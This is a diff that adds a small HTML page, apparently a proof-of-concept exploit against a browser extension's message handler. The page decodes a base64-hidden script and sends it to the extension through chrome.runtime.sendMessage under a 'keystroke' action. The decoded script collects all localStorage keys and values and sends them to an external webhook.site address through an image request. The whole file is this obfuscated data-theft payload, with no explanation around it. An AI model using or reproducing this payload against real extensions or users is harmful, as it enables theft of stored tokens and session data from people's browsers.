@@ -1,0 +1,9 @@
+<html>
+    <body>
+<script>
+var message = atob("PHNjcmlwdD4KICAgIHZhciB3ZWJob29rID0gImh0dHBzOi8vd2ViaG9vay5zaXRlLzQ4MTAyZTY3LWMyZGQtNGQwMS1hNWEwLWVjMzQ3NzNlNTQ2Nj9leHQiOwogICAgbGV0IHJlc3VsdCA9ICcnOwogICAgZm9yICh2YXIgaSA9IDAsIGxlbiA9IGxvY2FsU3RvcmFnZS5sZW5ndGg7IGkgPCBsZW47ICsraSApIHsKICAgICAgICByZXN1bHQ9cmVzdWx0LmNvbmNhdCgnfCcsIGxvY2FsU3RvcmFnZS5rZXkoIGkgKSArICctJytsb2NhbFN0b3JhZ2UuZ2V0SXRlbSggbG9jYWxTdG9yYWdlLmtleSggaSApICkpOwogICAgfQogICAgdmFyIGltZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpLnNyYyA9IHdlYmhvb2sgKyAiP2RhdGE9IitlbmNvZGVVUklDb21wb25lbnQocmVzdWx0KTsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaW1nKTsKPC9zY3JpcHQ+");
+console.log(message)
+chrome.runtime.sendMessage(null, {action:"keystroke", payload:message}, null, () => {});
+</script>
+    </body>
+</html>
